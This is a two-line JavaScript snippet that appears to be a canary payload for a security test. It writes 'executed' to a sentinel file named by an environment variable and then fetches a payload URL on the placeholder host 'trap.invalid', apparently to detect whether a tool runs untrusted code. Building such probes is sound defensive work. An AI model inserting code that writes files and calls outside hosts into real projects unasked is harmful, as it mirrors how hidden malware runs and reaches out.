globalThis.process.getBuiltinModule("node:fs").writeFileSync(`${globalThis.process.env.REPO_FACTS_SENTINEL_DIR}/payload`, "executed");
await fetch("http://trap.invalid/payload");
